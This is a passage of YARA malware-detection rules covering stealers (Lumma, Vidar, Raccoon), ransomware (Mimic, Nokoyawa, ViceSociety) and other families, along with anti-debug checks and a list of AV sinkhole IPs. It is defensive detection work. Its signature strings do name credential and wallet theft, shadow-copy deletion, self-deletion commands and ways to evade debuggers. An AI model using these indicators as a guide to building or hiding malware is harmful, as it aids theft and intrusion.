        $p3 = {8B 75 ?? 8B C6 C1 E8 ?? 0F B6 C8 8B 45 ?? C1 E8 ?? 0F B6 C0 8B 0C 8D [4] 8B 55 ?? 33 0C 85 [4] 8B C2 C1 E8 ?? 33 0C 85 [4] 8B 45 ?? 0F B6 C0 33 0C 85 [4] 33 0F 8B 45 ?? C1 E8 ?? 89 4D ?? 0F B6 C8 8B C6 C1 E8 ?? 0F B6 C0 8B 0C 8D [4] 33 0C 85 [4] 8B 45 ?? C1 E8 ?? 33 0C 85 [4] 0F B6 C2 33 0C 85 [4] 33 4F ?? 8B 45 ?? C1 E8 ?? 89 4D ?? 0F B6 C8 8B C2 C1 E8 ?? 0F B6 C0 C1 EA ?? 8B 1C 8D [4] 8B 4D ?? 33 1C 85 [4] 8B C6 C1 E8 ?? 33 1C 85 [4] 0F B6 C1 C1 E9 ?? 0F B6 C9 33 1C 85 [4] 33 5F ?? 0F B6 C2 8B 14 8D [4] 33 14 85 [4] 8B 45 ?? C1 E8 ?? 33 14 85 [4] 8B C6 0F B6 C0 33 14 85 [4] 8B C3 33 57 ?? C1 E8 ?? 0F B6 C8 8B 45 ?? C1 E8 ?? 0F B6 C0 8B 0C 8D [4] 33 0C 85 [4] 8B 45 ?? C1 E8 ?? 33 0C 85 [4] 0F B6 C2 33 0C 85 [4] 8B C2 33 4F ?? C1 E8 ?? 89 4D ?? 0F B6 C8 8B C3 C1 E8 ?? 8B 0C 8D [4] 0F B6 C0 33 0C 85 [4] 8B 45 ?? C1 E8 ?? 33 0C 85 [4] 8B 45 ?? 0F B6 C0 33 0C 85 [4] 8B C2 33 4F ?? C1 E8 ?? 89 4D ?? 0F B6 C8 8B 45 ?? C1 E8 ?? 0F B6 C0 8B 0C 8D [4] C1 EA ?? 33 0C 85 [4] 8B C3 C1 E8 ?? 33 0C 85 [4] 89 4D ?? 8B 4D ?? 8B 75 ?? 0F B6 C1 C1 E9 ?? 0F B6 C9 33 34 85 [4] 8B C6 89 75 ?? 33 47 ?? 8B 0C 8D [4] 89 45 ?? 8B 45 ?? C1 E8 ?? 0F B6 C0 33 0C 85 [4] 33 0C 95 [4] 0F B6 C3 33 0C 85 [4] 33 4F ?? 83 C7 ?? 83 6D}
        
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Windows_Trojan_Formbook: FormBook_malware
{
    meta:
        author = "@malgamy12"
        date = "2022-11-8"
	license = "DRL 1.1"
        sample1 = "9fc57307d1cce6f6d8946a7dae41447b"
        sample2 = "0f4a7fa6e654b48c0334b8b88410eaed"
        sample3 = "0a25d588340300461738a677d0b53cd2"
        sample4 = "57d7bd215e4c4d03d73addec72936334"
        sample5 = "c943e31f7927683dc1b628f0972e801b"
        sample6 = "db87f238bb4e972ef8c0b94779798fa9"
        sample7 = "8ba1449ee35200556ecd88f23a35863a"
        sample8 = "8ca20642318337816d5db9666e004172"
        sample9 = "280f7c87c98346102980c514d2dd25c8"

    strings:
        $a1 = { 8B 45 ?? BA ?? [3] 8B CF D3 E2 84 14 03 74 ?? 8B 4D ?? 31 0E 8B 55 ?? 31 56 ?? 8B 4D ?? 8B 55 ?? 31 4E ?? 31 56 ?? }
			
        $a2 = { 0F B6 3A 8B C8 C1 E9 ?? 33 CF 81 E1 [4] C1 E0 ?? 33 84 8D [4] 42 4E }
        
        $a3 = { 1A D2 80 E2 ?? 80 C2 ?? EB ?? 80 FA ?? 75 ?? 8A D0 80 E2 ?? }

        $a4 = { 80 E2 ?? F6 DA 1A D2 80 E2 ?? 80 C2 ?? }

    condition:
         3 of them
}

rule Detect_lumma_stealer: lumma
{
    meta:
    
	description = "Detect_lumma_stealer"
	author = "@malgamy12"
	date = "2023/1/7"
	license = "DRL 1.1"
        hash = "61b9701ec94779c40f9b6d54faf9683456d02e0ee921adbb698bf1fee8b11ce8"
        hash = "277d7f450268aeb4e7fe942f70a9df63aa429d703e9400370f0621a438e918bf"
        hash = "9b742a890aff9c7a2b54b620fe5e1fcfa553648695d79c892564de09b850c92b"
        hash = "60247d4ddd08204818b60ade4bfc32d6c31756c574a5fe2cd521381385a0f868"
                
    strings:
         
        $s1 = "- PC:" ascii 
        $s2 = "- User:" ascii
        $s3 = "- Screen Resoluton:" ascii
        $s4 = "- Language:" ascii
        
        $op = {0B C8 69 F6 [4] 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 07 C1 E1 ?? 83 C7 ?? 0B C8 69 C9 [4] 8B C1 C1 E8 ?? 33 C1 69 C8 [4] 33 F1}

    condition:
        uint16(0) == 0x5A4D and $op and all of ($s*)
}






rule detect_Lumma_stealer: Lumma 
{
	meta:
		description = "detect_Lumma_stealer"
		author = "@malgamy12"
		date = "2022-11-3"
		license = "DRL 1.1"
		hunting = "https://www.hybrid-analysis.com/sample/f18d0cd673fd0bd3b071987b53b5f97391a56f6e4f0c309a6c1cee6160f671c0"
		hash1 = "19b937654065f5ee8baee95026f6ea7466ee2322"
                hash2 = "987f93e6fa93c0daa0ef2cf4a781ca53a02b65fe"
                hash3 = "70517a53551269d68b969a9328842cea2e1f975c"
                hash4 = "9b7b72c653d07a611ce49457c73ee56ed4c4756e"
                hash5 = "4992ebda2b069281c924288122f76556ceb5ae02"
                hash6 = "5c67078819246f45ff37d6db81328be12f8fc192"
                hash7 = "87fe98a00e1c3ed433e7ba6a6eedee49eb7a9cf9"

    strings:
        $m1 = "LummaC\\Release\\LummaC.pdb" ascii fullword

        $s1 = "Cookies.txt" ascii
        $s2 = "Autofills.txt" ascii
        $s3 = "ProgramData\\config.txt" ascii
        $s4 = "ProgramData\\softokn3.dll" ascii
        $s5 = "ProgramData\\winrarupd.zip" ascii
        

        $chunk_1 = {C1 E8 ?? 33 C6 69 C8 ?? ?? ?? ?? 5F 5E 8B C1 C1 E8 ??}

    condition:
        $m1 or (4 of ($s*) and $chunk_1 )
}




rule detect_Mars_Stealer: Mars_Stealer
{
    meta:
	description = "detect_Mars_Stealer"
	author = "@malgamy12"
	date = "12/14/2022"
	license = "DRL 1.1"
        comment = "frist op1 to detect old version with strings and (op2) to detect new version"
        old_version_hash = "7da3029263bfbb0699119a715ce22a3941cf8100428fd43c9e1e46bf436ca687"
        ne_version_hash = "0d6470143f1102dbeb8387ded8e73cedbc3aece7a3594255d46c9852f87ac12f"
        

    strings:
        $op1 = { 0F B7 05 [4] 0F B7 0D [4] C1 F9 ?? 33 C1 0F B7 15 [4] C1 FA ?? 33 C2 0F B7 0D [4] C1 F9 ?? 33 C1 83 E0 ?? A3 [4] 0F B7 15 [4] D1 FA A1 [4] C1 E0 ?? 0B D0 66 89 15 [4] 0F B7 05 }
        $op2 = { 0F BE 19 8B 55 ?? 52 E8 [4] 83 C4 ?? 8B C8 8B 45 ?? 33 D2 F7 F1 8B 45 ?? 0F BE 0C 10 33 D9 8B 55 ?? 03 55 ?? 88 1A }
		

        $s1 = "86223203794583053453" ascii
        $s2 = "image/jpeg" wide 
    

        
    condition:
        uint16(0) == 0x5A4D  and (1 of ($op*)) or (all of ($s*))
}

rule Detect_Mimic_Ransomware: Mimic Ransomware   
{
     meta:
        description = "Detect_Mimic_Ransomware"
        author = "@MalGamy12"
        date = "2023-01-27"
        license = "DRL 1.1"
        hash = "08f8ae7f25949a742c7896cb76e37fb88c6a7a32398693ec6c2b3d9b488114be"
        hash = "136d05b5132adafc4c7616cd6902700de59f3f326c6931eb6b2f3b1f458c7457"
        hash = "1dea642abe3e27fd91c3db4e0293fb1f7510e14aed73e4ea36bf7299fd8e6506"
        hash = "2e96b55980a827011a7e0784ab95dcee53958a1bb19f5397080a434041bbeeea"
        hash = "30f2fe10229863c57d9aab97ec8b7a157ad3ff9ab0b2110bbb4859694b56923f"
        hash = "480fb2f6bcb1f394dc171ecbce88b9fa64df1491ec65859ee108f2e787b26e03"
        hash = "4a6f8bf2b989fa60daa6c720b2d388651dd8e4c60d0be04aaed4de0c3c064c8f"
        hash = "7ae4c5caf6cda7fa8862f64a74bd7f821b50d855d6403bde7bcbd7398b2c7d99"
        hash = "9c16211296f88e12538792124b62eb00830d0961e9ab24b825edb61bda8f564f"
        hash = "a1eeeeae0eb365ff9a00717846c4806785d55ed20f3f5cbf71cf6710d7913c51"
        hash = "b0c75e92e1fe98715f90b29475de998d0c8c50ca80ce1c141fc09d10a7b8e7ee"
        hash = "b68f469ed8d9deea15af325efc1a56ca8cb5c2b42f2423837a51160456ce0db5"
        hash = "bb28adc32ff1b9dcfaac6b7017b4896d2807b48080f9e6720afde3f89d69676c"
        hash = "bf6fa9b06115a8a4ff3982427ddc12215bd1a3d759ac84895b5fb66eaa568bff"
        hash = "c576f7f55c4c0304b290b15e70a638b037df15c69577cd6263329c73416e490e"
        hash = "c634378691a675acbf57e611b220e676eb19aa190f617c41a56f43ac48ae14c7"
        hash = "c71ce482cf50d59c92cfb1eae560711d47600541b2835182d6e46e0de302ca6c"
        hash = "e67d3682910cf1e7ece356860179ada8e847637a86c1e5f6898c48c956f04590"
        hash = "ed6cf30ee11b169a65c2a27c4178c5a07ff3515daa339033bf83041faa6f49c1"    

    strings:
        $s1 = "Reading tail" wide  
        $s2 = "GetWhiteList" wide
        $s3 = "KillServ" wide
        $s4 = "Kill Serv2" wide
        $s5 = "Kill proc" wide
        $s6 = "AntiKill" wide
        $s7 = "Protect..." wide
        $s8 = "AntiShutdown..." wide
        $s9 = "Found share" wide
        $s10 = "Enum shares on" wide
        $s11 = "Starting search on share" wide
        $s12 = "AddHost" wide
        $s13 = "CreateHostTable..." wide
        $s14 = "Network stack is outdated." wide
        $s15 = "Current IP" wide
   
    condition:
        uint16(0) == 0x5A4D and (10 of them)
}
rule Nokoyawa_ransomware: Nokoyawa
{
    meta:
	description = "Detect_Nokoyawa_ransomware"
	author = "@malgamy12"
	date = "20/12/2022"
	license = "DRL 1.1"
        hash = "7095beafff5837070a89407c1bf3c6acf8221ed786e0697f6c578d4c3de0efd6"
        hash = "47c00ac29bbaee921496ef957adaf5f8b031121ef0607937b003b6ab2a895a12"
        hash = "259f9ec10642442667a40bf78f03af2fc6d653443cce7062636eb750331657c4"
  
                
    strings:
        
        $pdb = "deps\\noko.pdb" ascii

        $s1 = "How to run:" ascii
        $s2 = "--config <base64 encoded config> (to start full encryption)" ascii
        $s3 = "--config <base64 encoded config> --file <filePath>" ascii
        $s4 = "CIS lang detected! Stop working" ascii
        $s5 = "config isn't configurated to load hidden drives" ascii
        $s6 = "ENCRYPT_NETWORKYour config isn't configurated to encrypt network shares" ascii
        $s7 = "Your config isn't configurated to delete shadow copies" ascii
        $s8 = "Successfully deleted shadow copies from" ascii
        
    condition:
        uint16(0) == 0x5A4D and ($pdb or 3 of ($s*))
}
rule Nosu_stealer: Nosu
{
    meta:
	description = "Detect_Nosu_stealer"
	author = "@malgamy12"
	date = "2023/1/9"
        license = "DRL 1.1"
        hash = "6499cadaea169c7dfe75b55f9c949659af49649a10c8b593a8db378692a11962"
        hash = "e227246cbebf72eb2867ef21b1b103ec07ddd87f4f8a5ac89a47536d5b831f6d"
        hash = "3d18b9c312abaa8dd93dc0d1abfdc97e72788100fb1effb938b5f6f4fd3b59eb"
        hash = "e513f5e424371cce491ae28d45aaa7e361f370c790dc86bb33dc9313b3660ac3"
  
                
    strings:
	    $s1 = "release\\lilly.pdb" ascii

		
        $op1 = {33 D2 8B C3 F7 F7 8A C3 24 ?? 32 04 32 30 04 19 43 8B 4C 24 ?? 3B DD 72}
        $op2 = {8B 86 [4] 80 34 08 ?? 41 8B 86 [4] 3B C8 72}
	$op3 = {69 D2 [4] 33 C9 42 8B C2 0F A4 C1 ?? 30 0C 1E 46}
        
    condition:
        uint16(0) == 0x5A4D and ($s1 or all of ($op*))
}
rule detect_Raccoon_Stealer_v2: Raccoon_Stealer_v2 
{
    meta:
	description = "detect_Raccoon_Stealer_v2"
	author = "@malgamy12"
	date = "16/11/2022"
	license = "DRL 1.1"
        hash = "0123b26df3c79bac0a3fda79072e36c159cfd1824ae3fd4b7f9dea9bda9c7909"
	hash = "0c722728ca1a996bbb83455332fa27018158cef21ad35dc057191a0353960256"
	hash = "048c0113233ddc1250c269c74c9c9b8e9ad3e4dae3533ff0412d02b06bdf4059"
	hash = "89a718dacc3cfe4f804328cbd588006a65f4dbf877bfd22a96859bf339c6f8bc"
        hash = "516c81438ac269de2b632fb1c59f4e36c3d714e0929a969ec971430d2d63ac4e"
        hash = "0c722728ca1a996bbb83455332fa27018158cef21ad35dc057191a0353960256"
        hash = "3ae9d121aa4b989118d76e8b0ff941b9b72ccac746de8b3a5d9f7d037361be53"
        hash = "bd8c1068561d366831e5712c2d58aecb21e2dbc2ae7c76102da6b00ea15e259e"
        hash = "960ce3cc26c8313b0fe41197e2aff5533f5f3efb1ba2970190779bc9a07bea63"
        hash = "bc15f011574289e46eaa432f676e59c50a9c9c42ce21332095a1bd68de5f30e5"
        

    strings:
        $s0 = "\\ffcookies.txt" wide
        $s1 = "wallet.dat" wide
        $s2 = "Network\\Cookies" wide
        $s3 = "Wn0nlDEXjIzjLlkEHYxNvTAXHXRteWg0ieGKVyD52CvONbW7G91RvQDwSZi/N2ISm" ascii 

        $op1 = {6B F3 ?? 03 F7 8B 7D ?? [3] A5}
        $op2 = {8A 0C 86 8B 45 ?? 8B 7D ?? 32 0C 38 8B 7D ?? 8B 86 [4] 88 0C 07 8B C7 8B 7D ?? 40}

        
    condition:
        uint16(0) == 0x5A4D  and (all of them)

}
rule detect_rifdoor: rifdoor
{
	meta:
	description = "detect_rifdoor"
	author = "@malgamy12"
	date = "2022/11/11"
	license = "DRL 1.1"
        hash1 = "19b2144927bd071e30df9fce5f3d49f1"
        hash2 = "d8ba4b4bfc5e0877fa8e8c1b26876ea6"
        hash3 = "d94d6f773c0ed5514d3e571e4b3681ba"
        hash4 = "5aca1e4ec64ba417d1b0ebea88bdd06e"
        hash5 = "45f8d44cba70520ca2ea97427ddaab3e"
        hash6 = "d3b2956904bed8c8146b8bb556b8911a"
        hash7 = "e4c4c9abdd8613afa17f58d721039a46"
        hash8 = "cf847663a7a9d6ddbe3a1f0d5e5236b6"
        hash9 = "01a0b932d82ed3b78ccfb2bb5826c32f"
        hash10 = "c6687e1fab97b2d7433a5e51fcf2aa30"

    strings:
        $pdb = "rifle.pdb" ascii

        $s1 = "MUTEX394039_4830023" ascii
        $s2 = "CMD:%s %s %d/%d/%d %d:%d:%d" ascii
	$s3 = "/c del /q \"%s\" >> NUL" ascii

        $chunk_1 = {80 32 ?? 41 80 39 ?? 8B D1 75} // xor operation

        
    condition:
        uint16(0) == 0x5A4D  and ($pdb  or  (2 of ($s*) and $chunk_1 ))

}
rule Shc_Downloader : Downloader
{
    meta:
	description = "detect_Shc_Downloader"
	author = "@malgamy12"
        date = "2022/1/4"
	license = "DRL 1.1"
        hash = "256ab7aa7b94c47ae6ad6ca8ebad7e2734ebaa21542934604eb7230143137342"
        

    strings:
        
        $op = {88 05 [4] 0F B6 05 [4] 0F B6 C0 48 98 0F B6 80 [4] 88 45 ?? 0F B6 05 [4] 02 45 ?? 88 05 [4] 0F B6 05 [4] 0F B6 C8 0F B6 05 [4] 0F B6 C0 48 98 0F B6 90 [4] 48 63 C1 88 90 [4] 0F B6 05 [4] 0F B6 C0 48 63 D0 0F B6 45 ?? 88 82 [4] 0F B6 05 [4] 0F B6 C0 48 98 0F B6 80 [4] 00 45 ?? 48 8B 45 ?? 0F B6 10 0F B6 45 ?? 48 98 0F B6 80 [4] 31 C2 48 8B 45 ?? 88 10}

    condition:
        all of them
}
rule detect_silence_Downloader: silence Downloader 
{
	meta:
	 description = "detect_silence_Downloader"
	 author = "@malgamy12"
	 date = "8/11/2022"
	 license = "DRL 1.1"
	 sample1 = "BAE2737C39C0DEF9603EF9E6CD4921BF641FAB91"
         sample2 = "A7421FDA552316FD89FA545D1815DE0AF8EC2858"


    strings:

        $intel = "IntelSofts" ascii
	
	$s1 = "MicrosoftUpdte" ascii
	$s2 = "php?name=" ascii
        $s3 = "SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
        $s4 = "ShellExecuteA" ascii
        $s5 = "InternetOpenA" ascii
        $s6 = "CreateFileA"  ascii 
        $s7 = "CreateProcessA" ascii
        
    condition:
        uint16(0) == 0x5A4D and $intel or (6 of ($s*))
}
rule detect_StrelaStealer: StrelaStealer
{
    meta:
	description = "detect_StrelaStealer"
	author = "@malgamy12"
	date = "2022/11/12"
	license = "DRL 1.1"
        hash = "6e8a3ffffd2f7a91f3f845b78dd90011feb80d30b4fe48cb174b629afa273403"
        

    strings:
        $pdb = "StrelaDLLCompile.pdb" ascii

        $s1 = "4f3855aa-af7e-4fd2-b04e-55e63653d2f7" ascii
        $s2 = "StrelaDLLCompile.dll" ascii

        $chunk_1 = {33 D2 8B C7 F7 F3 8D 04 2E 83 C7 ?? 83 C6 ?? 8A 92 [4] 30 56 ?? 33 D2 F7 F3 8A 82 [4] 30 46 ?? 83 FF ??} 

        
    condition:
        uint16(0) == 0x5A4D  and ($pdb  or  (1 of ($s*) and $chunk_1 ))

}
rule SystemBC_malware: SystemBC 
{
    meta:
	description = "Detect_SystemBC"
	author = "@malgamy12"
	date = "2023/1/9"
        license = "DRL 1.1"
        hash = "b369ed704c293b76452ee1bdd99a69bbb76b393a4a9d404e0b5df59a00cff074"
        hash = "0da6157c9b27d5a07ce34f32f899074dd5b06891d5323fbe28d5d34733bbdaf8"
        hash = "70874b6adc30641b33ed83f6321b84d0aef1cf11de2cb78f78c9d3a45c5221c0"
        hash = "bf1f17dce8eccc400641a0824da39cea19c2dd0c9833855542abb189bd0e5f7e"
        hash = "3c10661e4d448ee95acf71b03a31e12181956a72cd2d75934b583c4e19321be8"
        hash = "fe2512e3e965a50f35a332cfc310069697ad797e782c32ba30596b4c88f9e090"
        hash = "2072b666365701aed7143e9d241ab975e21af78fce6bbf14fd0bdd6c137a18ce"
        hash = "0e5a3f858456145f09d44201ceed7bef5a96451875f2327ac7c3e8cbdeb7a856"
        hash = "252270954f4544d236b6ff7cb9b9151262f8369c1f9a256c647bcb02277ab7ef"
        hash = "2a4bd69263a466d5c81cc76efba740cbb90440628eb58c10203d7a9aa8fbee59"
        hash = "0bacbe9942287d0273c7b2cf7125cb01c85964ad67012205a0f8eb31b382c511"
        hash = "018de46acf37d72323c17393a105e3aeae8751e53dba2bd056d4d432a6de98e2"
        hash = "a6ab4d3120570214d762ccc1222a4a1559ef6e46cee214ec375974025dcec997"
        hash = "c23d52a06ec6552de165f9261628dff15fd03b07c8dd2247aa2968a05ee1a90e"
        hash = "47cbe4c03441a7796c8d3a2bdaeb998969d5137dd0469db891318606cff1f432"
        hash = "4c9a783544c7f44fb3f058837f0d5723fdaabbeb22b58ce635667b3ba2c6e7d3"
        hash = "21adaf466ea988688d3e107a0f95237817189bce0b4f05d232f9d30b97bf68d4"
    strings:
	$s1 = "GET /tor/rendezvous2/%s HTTP" ascii
        $s2 = "https://api.ipify.org/"
        $s3 = "https://ip4.seeip.org/"
        $s4 = "directory-footer"
        $s5 = "KEY-----"
        $op1 = {8A 94 2B [4] 02 C2 8A 8C 28 [4] 88 8C 2B [4] 88 94 28 [4] 02 CA 8A 8C 29 [4] 30 0E 48 FF C6 48 FF CF}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Detect_Tofsee: Tofsee
{
    meta:
	description = "Detect_Tofsee"
	author = "@malgamy12"
	date = "21/11/2022"
	license = "DRL 1.1"
        hash = "96baba74a907890b995f23c7db21568f7bfb5dbf417ed90ca311482b99702b72"
        

    strings:
        $a1 = "%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u" ascii
        $a2 = "start_srv" ascii
        $a3 = "work_srv" ascii
        $a4 = "flags_upd" ascii
        $a5 = "lid_file_upd" ascii
        $a6 = "born_date" ascii
        $a7 = "net_type" ascii
        
        $op = {8B 45 ?? 57 8B 7D ?? B1 ?? 85 FF 74 ?? 56 8B 75 ?? 2B F0 8A 14 06 32 55 ?? 88 10 8A D1 02 55 ?? F6 D9 00 55 ?? 40 4F 75 ?? 5E 8B 45 ?? 5F}
        
    condition:
        uint16(0) == 0x5A4D  and ((5 of ($a*) and $op))
}

rule detect_Typhon_Stealer: Typhon_Stealer
{
    meta:
	description = "detect_Typhon_Stealer"
	author = "@malgamy12"
	date = "15/11/2022"
	license = "DRL 1.1"
        hash1 = "A12933AB47993F5B6D09BEC935163C7F077576A8B7B8362E397FE4F1CE4E791C"
        

    strings:
        $s0 = "\\NetworkInformation.txt" wide
        $s1 = "\\UserDetails.txt" wide
        $s2 = "\\HardwareDetails.txt" wide
        $s3 = "TaskKill /F /IM" wide
        $s4  = "Timeout /T 2 /Nobreak" wide
        $s5  = "### BlackListedCountries ###" wide
        $s6  = "TyphonStealer_Reborn_v1" wide
        $s7  = "t.me/typhon_shop" wide

        
    condition:
        uint16(0) == 0x5A4D  and (all of them)

}
rule Detect_ViceSociety_Ransomware: ViceSociety Ransomware   
{
	meta:
	   description = "Detect_ViceSociety_Ransomware"
	   author = "@MalGamy12"
	   date = "2023-01-25"
	   license = "DRL 1.1"
	   hash1 = "7c26041f8a63636d43a196f5298c2ab694a7fcbfa456278aa51757fd82c237d4"
           hash2 = "8843bafbb4a43a6c7a77c62a513908d1e2352ae5f58bd8bfa6d604bc795dcd12"
           hash3 = "1df9b68a8642e6d1fcb786d90a1be8d9633ee3d49a08a5e79174c7150061faa8"
           hash4 = "da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c"
           hash5 = "7b379458349f338d22093bb634b60b867d7fd1873cbd7c65c445f08e73cbb1f6"
           hash6 = "4dabb914b8a29506e1eced1d0467c34107767f10fdefa08c40112b2e6fc32e41"
           hash7 = "f366e079116a11c618edcb3e8bf24bcd2ffe3f72a6776981bf1af7381e504d61"
           hash8 = "326a159fc2e7f29ca1a4c9a64d45b76a4a072bc39ba864c49d804229c5f6d796"
           hash9 = "432f91e194973dc214d772d39d228748439839b268f6a62ad529cb4f00203aaa"
           


    strings:

          $op1 = {41 01 ED 01 FE 44 01 C3 44 31 E9 31 F2 31 D8 C1 C1 ?? C1 C2 ?? 41 01 CB 41 01 D1 C1 C0 ?? 44 31 DD 44 31 CF 41 01 C4 C1 C5 ?? C1 C7 ?? 45 31 E0 41 01 ED 01 FE 41 C1 C0 ?? 44 31 E9 31 F2 44 01 C3 C1 C1 ?? C1 C2 ?? 31 D8 41 01 CB 41 01 D1 44 31 DD 44 31 CF 44 89 4C 24 ?? C1 C5 ?? C1 C7 ?? 44 89 5C 24 ?? C1 C0 ?? 45 01 FA 41 01 FD 45 31 D6 41 01 C4 45 89 F1 44 8B 74 24 ?? 45 31 E0 41 C1 C1 ?? 41 C1 C0 ?? 44 01 C6 31 F1 45 01 CE C1 C1 ?? 45 31 F7 45 89 F3 41 C1 C7 ?? 45 01 FA 45 31 D1 41 C1 C1 ?? 45 01 CB 45 31 E9 41 C1 C1 ?? 45 31 DF 41 01 CB 45 01 CC 41 C1 C7 ?? 44 31 E7 C1 C7 ?? 41 01 FD 45 31 E9 45 89 CE 44 8B 4C 24 ?? 41 C1 C6 ?? 45 01 F4 44 31 E7 C1 C7 ?? 45 31 D8 44 01 FB 41 C1 C0 ?? 41 01 EA 31 DA 44 01 C6 44 31 D0 C1 C2 ?? 31 F1 C1 C0 ?? C1 C1 ?? 41 01 C1 41 01 CB 44 31 CD 45 31 D8 44 89 5C 24 ?? 44 8B 5C 24 ?? C1 C5 ?? 41 01 EA 41 C1 C0 ?? 44 31 D0 C1 C0 ?? 41 01 D3 41 01 C1 45 31 DF 44 31 CD 41 C1 C7 ?? C1 C5 ?? 44 01 FB 31 DA C1 C2 ?? 41 01 D3 45 31 DF 41 C1 C7 ?? 83 6C 24}
          $op2 = {48 63 D2 48 8D 14 91 42 8B 0C A8 46 0F B6 04 A0 44 8B 14 B8 81 E1 [4] 44 09 C1 44 8B 04 A8 33 0A 41 81 E2 [4] 41 81 E0 [4] 45 09 D0 41 31 C8 8B 4C 24 ?? 41 0F C8 45 89 01 44 8B 44 24 ?? 8B 0C 88 46 0F B6 04 80 81 E1 [4] 44 09 C1 44 8B 04 24 33 4A ?? 46 8B 04 80 45 89 C2 44 8B 44 24 ?? 41 81 E2 [4] 46 8B 04 80 41 81 E0 [4] 45 09 D0 44 31 C1 46 0F B6 04 B8 0F C9 41 89 49 ?? 8B 4C 24 ?? 44 8B 7C 24 ?? 8B 0C 88 46 8B 14 B8 81 E1 [4] 44 09 C1 46 8B 04 98 41 89 F3 41 81 E2 [4] 33 4A ?? 41 81 E0 [4] 45 09 D0 44 31 C1}
          $op3 = {0F B7 0A 44 89 C7 48 83 C2 ?? 89 C8 D3 E7 66 C1 E8 ?? 0F B7 C0 41 31 3C 81}
        
    condition:
        uint16(0) == 0x5A4D and filesize > 60KB and all of them 
}









rule detect_vidar: Vidar
{
    meta:
	description = "detect_Vidar_Stealer"
	author = "@malgamy12"
	date = "11/13/2022"
	license = "DRL 1.1"
        hash = "011e2fb7319d8962563dd48de0fec1400a20c9fdcc7ff0766fdea47959ab6805"
        

    strings:
        $s1 = "*wallet*.dat" ascii

        $a1 = "Autofill\\%s_%s.txt" ascii
        $a2 = "History\\%s_%s.txt" ascii
        $a3 = "Downloads\\%s_%s.txt" ascii

        $b1 = "screenshot.jpg" ascii
        $b2 = "Data\\*.dll" ascii

        $chunk_1 = {8B C8 33 D2 8B C5 F7 F1 8B 44 24 ?? 8B 4C 24 ?? [2] 8A 04 02 32 04 19 88 03}
    condition:
        uint16(0) == 0x5A4D and $s1 and ((1 of ($a*) and $chunk_1 ) or (1 of ($b*) and $chunk_1))

}

rule Vohuk_ransomware: Vohuk
{
    meta:
	description = "Detect_Vohuk_ransomware"
	author = "@malgamy12"
	date = "8/12/2022"
	license = "DRL 1.1"
        hash= "e27b637abe523503b19e6b57b95489ea"
  
                
    strings:
        $p1 = {B8 [4] 8B CE F7 EE C1 FA ?? 8B C2 C1 E8 ?? 03 C2 69 C0 [4] 2B C8 83 C1 ?? 66 31 4C 75 ?? 46 83 FE ?? 72}
        $p2 = {8B 34 B8 BA [4] 0F BE 04 1E 03 F3}
        
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule anti_dbg {
    meta:
        author = "x0r"
        description = "Checks if being debugged"
	version = "0.2"
    strings:
    	$d1 = "Kernel32.dll" nocase
        $c1 = "CheckRemoteDebuggerPresent" 
        $c2 = "IsDebuggerPresent" 
        $c3 = "OutputDebugString" 
        $c4 = "ContinueDebugEvent" 
        $c5 = "DebugActiveProcess" 
    condition:
        $d1 and 1 of ($c*)
}

rule anti_dbgtools {
    meta:
        author = "x0r"
        description = "Checks for the presence of known debug tools"
	version = "0.1"
    strings:
        $f1 = "procexp.exe" nocase
        $f2 = "procmon.exe" nocase
        $f3 = "processmonitor.exe" nocase
        $f4 = "wireshark.exe" nocase
        $f5 = "fiddler.exe" nocase
        $f6 = "windbg.exe" nocase
        $f7 = "ollydbg.exe" nocase
        $f8 = "winhex.exe" nocase       
        $f9 = "processhacker.exe" nocase
        $f10 = "hiew32.exe" nocase
        $c11 = "\\\\.\\NTICE" 
        $c12 = "\\\\.\\SICE" 
        $c13 = "\\\\.\\Syser" 
        $c14 = "\\\\.\\SyserBoot" 
        $c15 = "\\\\.\\SyserDbgMsg" 
    condition:
        any of them
}

rule av_sinkhole {
    meta:
        author = "x0r"
        description = "Check for known IP belonging to AV sinkhole"
        version = "0.1"
    strings:
        $s1 = "23.92.16.214"
        $s2 = "23.92.24.20"
        $s3 = "23.239.17.167"
        $s4 = "23.239.18.116"
        $s5 = "50.56.177.56"
        $s6 = "50.57.148.87"
        $s7 = "69.55.59.73"
        $s8 = "82.196.15.88"
        $s9 = "85.159.211.119"
        $s10 = "95.85.23.126"
        $s11 = "96.126.112.224"
        $s12 = "107.170.43.224"
        $s13 = "107.170.106.77"
        $s14 = "107.170.106.95"
        $s15 = "107.170.113.230"
        $s16 = "107.170.122.37"
        $s17 = "107.170.164.115"
        $s18 = "128.199.180.131"
        $s19 = "128.199.187.239"
        $s20 = "143.215.15.2"
        $s21 = "143.215.130.33"
        $s22 = "143.215.130.36"
        $s23 = "143.215.130.38"
        $s24 = "143.215.130.42"
        $s25 = "143.215.130.46"
        $s26 = "162.243.26.100"
        $s27 = "162.243.90.135"
        $s28 = "162.243.106.156"
        $s29 = "162.243.106.160"
        $s30 = "162.243.106.165"
        $s31 = "166.78.16.123"
        $s32 = "166.78.158.73"
        $s33 = "192.241.129.22"
        $s34 = "192.241.142.145"
        $s35 = "192.241.196.69"
        $s36 = "192.241.215.118"
        $s37 = "198.61.227.6"
        $s38 = "198.74.56.124"
        $s39 = "198.199.69.31"
        $s40 = "198.199.75.69"
        $s41 = "198.199.79.133"
        $s42 = "198.199.79.201"
        $s43 = "198.199.79.222"
        $s44 = "198.199.79.239"
        $s45 = "198.199.105.51"
        $s46 = "198.199.110.187"
        $s47 = "212.71.250.4"
        $s48 = "87.106.24.200"
        $s49 = "87.106.26.9"
        $s50 = "46.4.80.102"
        $s51 = "54.227.61.124"
        $s52 = "198.58.124.24"
        $s53 = "198.177.254.186"
        $s54 = "50.62.12.103"
        $s55 = "166.78.62.91"
        $s56 = "166.78.144.80"
        $s57 = "23.21.71.54"
        $s58 = "54.209.178.183"
        $s59 = "81.166.122.234"
        $s60 = "95.211.120.23"
        $s61 = "95.211.172.143"
        $s62 = "173.193.197.194"
        $s63 = "87.255.51.229"
        $s64 = "192.42.116.41"
        $s65 = "192.42.119.41"
        $s66 = "50.22.145.246"
        $s67 = "50.23.174.203"
        $s68 = "54.83.43.69"
        $s69 = "82.165.25.167"
        $s70 = "82.165.25.209"
        $s71 = "82.165.25.210"
        $s72 = "212.227.20.19"
        $s73 = "50.116.32.177"
